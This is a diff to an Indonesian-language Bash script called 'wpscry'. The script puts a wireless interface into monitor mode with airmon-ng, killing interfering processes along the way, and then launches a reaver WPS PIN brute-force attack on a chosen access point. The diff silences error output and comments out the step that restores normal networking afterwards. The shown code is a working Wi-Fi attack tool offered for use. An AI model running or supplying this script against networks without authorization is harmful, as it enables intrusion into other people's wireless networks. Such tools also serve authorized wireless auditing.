@@ -69,8 +69,8 @@ function mengaktifkan_mode_monitor(){
 		else
 			echo "[-] Interface ${interface} belum dalam mode monitor."
 			echo "[*] Mengaktifkan mode monitor pada interface ${interface}..."
-			airmon-ng check kill
-			airmon-ng start "${interface}"
+			airmon-ng check kill 2>/dev/null 
+			airmon-ng start "${interface}" 2>/dev/null
 			if ip link show | grep -q -w  "${interface}mon"; then
 				interface="${interface}mon"
 			else
@@ -156,11 +156,11 @@ function menjalankan_serangan(){
 	reaver -i "${interface}" -c "${channel}" -b "${bssid}" -e "${essid}" -s "${sesi}"
 }
 
-function menonaktifkan_mode_monitor(){
-        airmon-ng stop "${interface}"
-	systemctl restart NetworkManager
-        exit 0
-}
+#function menonaktifkan_mode_monitor(){
+#        airmon-ng stop "${interface}"
+#	systemctl restart NetworkManager
+#        exit 0
+#}
 
 # fungsi utama wpscry
 function wpscry(){
@@ -171,7 +171,7 @@ function wpscry(){
 	memindai_jaringan_wps
 	mengatur_target
 	menjalankan_serangan
-        menonaktifkan_mode_monitor
+#        menonaktifkan_mode_monitor
 }
 
 wpscry
